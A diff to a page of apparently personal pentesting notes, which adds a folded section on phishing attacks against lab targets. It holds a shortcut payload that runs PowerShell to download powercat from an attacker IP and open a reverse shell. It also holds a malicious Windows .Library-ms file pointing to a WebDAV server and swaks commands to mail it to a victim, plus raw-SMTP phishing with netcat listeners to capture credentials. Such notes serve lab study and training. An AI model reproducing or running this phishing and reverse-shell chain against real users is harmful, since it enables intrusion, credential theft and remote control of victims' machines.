@@ -8,6 +8,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/styles/navBarStyles.css">
     <link rel="stylesheet" href="/styles/walkthroughs.css">
+    <link rel="stylesheet" href="/styles/miscStyles.css">
         <link href="/styles/prism/prism.css" rel="stylesheet" />
         <link rel="icon" type="image/x-icon" href="/images/favicon2.png">
     <script src="/styles/prism/prism.js"></script>
@@ -44,10 +45,12 @@ PASS PasswordForthatUser</code></pre>
                 <h2>Sending mail</h2>
                 <ul>
                 <pre><code class="language-bash">swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body "http://10.10.14.5/"</code></pre>    
-                <p>Sending mail with attachments. Remember de to include the <b>@</b> Check the base64</p>
+                <p>Sending mail with attachments. Remember de to include the <b>@</b> Check the base64. <b style="color:red;"> It is highly recommended to place the file in the same location where you are executing the command </b></p>
                 <pre><code class="language-bash">swaks --to dave.wizard@supermagicorg.com --from car@melo --server supermagicorg.com --body "Click it" --attach @/mnt/hgfs/vmwareshared/config.Library-ms</code></pre>        
                 <h3>Phishing mail</h3>
-                <p>In this case we are performing a phising attack targeting a user which will click in the link and provide their credentials</p>
+                <div class="button" onclick="toggleDiv()">Capturing parameters with phising</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>In this case we are performing a phising attack targeting a user which will click in the link and provide their credentials</p>
                 <pre><code class="language-bash">nc -nv 192.168.104.137 25
 MAIL FROM: it@postfish.off
 250 2.1.0 Ok
@@ -63,7 +66,68 @@ quit
 221 2.0.0 Bye
 </code></pre>
               <p>Then capture the traffic</p>
-                <pre><code class="language-bash">nc -lvnp 80</code></pre>
+                <pre><code class="language-bash">nc -lvnp 80</code></pre>    
+                                </div>
+                <br>
+                <div class="button" onclick="toggleDiv()">Phising with reverse shell WEBDAV</div>
+                                <div id="foldedDiv" class="content">
+                                    <h2>Setup WebDAV service</h2>
+                                    <p>Windows library files are virtual containers for user content.They connect users with data stored in remote locations like web services or shares. These files have a <b>.Library-ms</b> file extension and can be executed by double-clicking them in Windows Explorer.</p>
+                <p>When clicking in the <b>.Library-ms</b> file you'll be viewing the contens of the wedav server which the file is pointing to (In the example below 192.168.119.2)</p>
+                <ul>
+                    <h4>Installation</h4>
+                    <pre><code class="language-bash">sudo apt install python3-wsgidav</code></pre>
+                    <h4>Usage</h4>
+                    <p>With the following command all contents from the folder you are hosting will be available when requesting the 127.0.0.1:80 host</p>
+                    <pre><code class="language-bash">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</code></pre>
+                    <p>Create a file and place it inside the folder where the webdav will host. Once the victim clicks the library file, it will be able to check all files you are hosting</p>
+                </ul>
+
+                <h3>Creating a malicious link file and capturing a reverse shell</h3>
+                <ul>
+                    <p>Go a windows computer (You can do it in your host machine), perform right click and select "New" and "Create shortcut". Inside put the following content</p>
+                    <pre><code class="language-bash">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.172:8000/powercat.ps1'); powercat -c 192.168.45.172 -p 4444 -e powershell"</code></pre>
+                    <p>Just like in the following image</p>
+                    <img src="/images/protocolsImages/shortcut.png" style="border: 1px solid; width: 30%; height: 30%;">
+                    <p>This will generate a .lnk file which will perform a connection to your kali machine and download powercat</p>
+                    <b>Transfer the file to the kali box and place it inside the webdav folder</b>
+                </ul>
+
+                <h3>Generate the malicious library file</h3>
+                <ul>
+                <p>Create a file named <b>config.Library-ms</b> and place the following content: <b>Remember to change IP and place the one from your kali machine</b></p>
+                <pre><code class="language-xml"><?xml version="1.0" encoding="UTF-8"?>&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+  &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+  &lt;version&gt;6&lt;/version&gt;
+  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+  &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+  &lt;templateInfo&gt;
+    &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+  &lt;/templateInfo&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+      &lt;isSupported&gt;false&lt;/isSupported&gt;
+      &lt;simpleLocation&gt;
+        &lt;url&gt;http://192.168.45.242&gt;
+      &lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt</code></pre>
+                </ul>    
+                    <h3>Finally send the phising mail</h3>
+                    <ul>
+                        <p>Create the body.txt file and place anything inside it. Use the following command to send the mail</p>
+                        <pre><code class="language-bash">sudo swaks -t jim@relia.com --from mark@relia.com --attach @config.Library-ms --server 192.168.239.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap</code></pre>
+                        <b>Remember to have the webdav server, the nc listener for the powercat and the nc listener for the reverse shell all of them running</b>
+                        <p>Here you can see the whole process by looking at the following image</p>
+                        <img src="/images/protocolsImages/phising.png" style="border: 1px solid; width: 50%; height: 50%;">
+                    </ul>
+                    
+                    
+                </div>                
+
+                
                 </ul>    
             
             <h2>Local Enumeration</h2>
@@ -169,5 +233,20 @@ RCPT TO:john
             </ul>   
         </div>
     </div>
+    
 </body>
+<script>
+        const botones = document.querySelectorAll(".button");
+
+    botones.forEach(boton => {
+    boton.addEventListener("click", () => {
+        const contenido = boton.nextElementSibling;
+        contenido.style.display =
+        contenido.style.display === "block" ? "none" : "block";
+    });
+    });
+
+    // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
+    window.addEventListener('load', generateMenu);
+    </script>
 </html>
